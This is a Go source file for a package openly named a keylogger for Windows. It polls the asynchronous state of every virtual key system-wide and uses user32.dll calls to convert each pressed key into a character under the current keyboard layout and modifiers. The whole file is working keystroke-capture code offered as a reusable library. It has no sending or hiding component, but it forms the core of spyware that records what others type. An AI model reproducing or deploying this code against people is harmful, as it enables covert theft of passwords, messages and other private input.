// Package keylogger is a keylogger for windows
package keylogger

import (
	"syscall"
	"unicode/utf8"
	"unsafe"

	"github.com/TheTitanrain/w32"
)

var (
	moduser32 = syscall.NewLazyDLL("user32.dll")

	procGetKeyboardLayout     = moduser32.NewProc("GetKeyboardLayout")
	procGetKeyboardState      = moduser32.NewProc("GetKeyboardState")
	procToUnicodeEx           = moduser32.NewProc("ToUnicodeEx")
	procGetKeyboardLayoutList = moduser32.NewProc("GetKeyboardLayoutList")
	procMapVirtualKeyEx       = moduser32.NewProc("MapVirtualKeyExW")
	procGetKeyState           = moduser32.NewProc("GetKeyState")
)

// NewKeylogger creates a new keylogger depending on
// the platform we are running on (currently only Windows
// is supported)
func NewKeylogger() Keylogger {
	kl := Keylogger{}

	return kl
}

// Keylogger represents the keylogger
type Keylogger struct {
	lastKey int
}

// Key is a single key entered by the user
type Key struct {
	Empty   bool
	Rune    rune
	Keycode int
	Name    string
}

// MouseButtonKeycodes list
var mouseButtonKeycodes = []int{
	1,   // Left mouse button
	2,   // Right mouse button
	4,   // Middle mouse button (scroll wheel click)
	5,   // X1 mouse button (side button)
	6,   // X2 mouse button (side button)
	255, // Any additional mouse buttons or special mouse events
}

// SpecialKeyNames maps special keycodes to their descriptive names
var specialKeyNames = map[int]string{
	w32.VK_SHIFT:       "[Shift]",
	w32.VK_CONTROL:     "[Ctrl]",
	w32.VK_MENU:        "[Alt]",
	w32.VK_RETURN:      "[Enter]",
	w32.VK_BACK:        "[Backspace]",
	w32.VK_TAB:         "[Tab]",
	w32.VK_ESCAPE:      "[Esc]",
	w32.VK_END:         "[End]",
	w32.VK_HOME:        "[Home]",
	w32.VK_LEFT:        "[Left]",
	w32.VK_UP:          "[Up]",
	w32.VK_RIGHT:       "[Right]",
	w32.VK_DOWN:        "[Down]",
	w32.VK_INSERT:      "[Insert]",
	w32.VK_DELETE:      "[Delete]",
	w32.VK_PRIOR:       "[Page Up]",
	w32.VK_NEXT:        "[Page Down]",
	w32.VK_F1:          "[F1]",
	w32.VK_F2:          "[F2]",
	w32.VK_F3:          "[F3]",
	w32.VK_F4:          "[F4]",
	w32.VK_F5:          "[F5]",
	w32.VK_F6:          "[F6]",
	w32.VK_F7:          "[F7]",
	w32.VK_F8:          "[F8]",
	w32.VK_F9:          "[F9]",
	w32.VK_F10:         "[F10]",
	w32.VK_F11:         "[F11]",
	w32.VK_F12:         "[F12]",
}

// isMouseButton checks if the keycode corresponds to a mouse button
func isMouseButton(keycode int) bool {
	for _, code := range mouseButtonKeycodes {
		if keycode == code {
			return true
		}
	}
	return false
}

// GetKey gets the current entered key by the user, if there is any
func (kl *Keylogger) GetKey() Key {
	activeKey := 0
	var keyState uint16

	for i := 0; i < 256; i++ {
		keyState = w32.GetAsyncKeyState(i)

		// Check if the most significant bit is set (key is down)
		// And check if the key is not a non-char key (except for space, 0x20)
		if keyState&(1<<15) != 0 && !isMouseButton(i) {
			activeKey = i
			break
		}
	}

	if activeKey != 0 {
		if activeKey != kl.lastKey {
			kl.lastKey = activeKey
			return kl.ParseKeycode(activeKey, keyState)
		}
	} else {
		kl.lastKey = 0
	}

	return Key{Empty: true}
}

// ParseKeycode returns the correct Key struct for a key taking into account the current keyboard settings
// That struct contains the Rune for the key and its descriptive name if it's a special key
func (kl Keylogger) ParseKeycode(keyCode int, keyState uint16) Key {
	key := Key{Empty: false, Keycode: keyCode}

	// Check if the key is a special key
	if name, found := specialKeyNames[keyCode]; found {
		key.Name = name
		return key
	}

	// Only one rune has to fit in
	outBuf := make([]uint16, 1)

	// Buffer to store the keyboard state in
	kbState := make([]uint8, 256)

	// Get keyboard layout for this process (0)
	kbLayout, _, _ := procGetKeyboardLayout.Call(uintptr(0))

	// Put all key modifier keys inside the kbState list
	if w32.GetAsyncKeyState(w32.VK_SHIFT)&(1<<15) != 0 {
		kbState[w32.VK_SHIFT] = 0xFF
	}

	capitalState, _, _ := procGetKeyState.Call(uintptr(w32.VK_CAPITAL))
	if capitalState != 0 {
		kbState[w32.VK_CAPITAL] = 0xFF
	}

	if w32.GetAsyncKeyState(w32.VK_CONTROL)&(1<<15) != 0 {
		kbState[w32.VK_CONTROL] = 0xFF
	}

	if w32.GetAsyncKeyState(w32.VK_MENU)&(1<<15) != 0 {
		kbState[w32.VK_MENU] = 0xFF
	}

	_, _, _ = procToUnicodeEx.Call(
		uintptr(keyCode),
		uintptr(0),
		uintptr(unsafe.Pointer(&kbState[0])),
		uintptr(unsafe.Pointer(&outBuf[0])),
		uintptr(1),
		uintptr(1),
		uintptr(kbLayout))

	key.Rune, _ = utf8.DecodeRuneInString(syscall.UTF16ToString(outBuf))

	return key
}
